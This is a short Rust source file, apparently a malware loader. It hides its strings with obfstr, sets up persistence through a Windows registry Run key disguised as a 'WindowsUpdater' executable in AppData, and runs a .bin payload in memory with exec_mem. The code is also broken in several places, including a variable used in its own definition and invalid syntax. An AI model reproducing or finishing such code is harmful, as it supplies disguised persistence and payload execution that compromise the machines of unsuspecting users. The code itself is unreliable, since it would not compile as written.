use obfstr::obfstr;
use std::process::Command;
use exec_mem::exec_mem;
use std::env;
pub struct Loader 
{
    pub var : String,
}

pub impl Loader 
{
    pub fn configurate_rg()
    {
        let username = env::var("USERNAME").unwrap();
        let ruta = format!(obfstr!(r"C:\Users\{}\AppData\WindowsUpdater\update.exe", username));
        let local = Command::new(obfstr!("reg"))
            .args([
                obfstr!("add"),
                obfstr!(r"HKCU\Software\Microsoft\Windows \CurrentVersion\Run"),
                obfstr!("/v"),
                obfstr!("WindowsaUpdaterdd"),
                obfstr!("/t"), 
                obfstr!("REG_SZ"),
                obfstr!("/d"),
                local,
                obfstr!("/f"),              
            ])
            .status()
            .expect();
    }
    
    pub fn terminator()
    {
        println!(obfstr!("[+] Cargando headers."));
        match exec_mem("SfbsASxSd.bin") 
        {
            Ok(_) => println!("done"),
            Err(e) => eprintln!("Error"),
        }

    }
}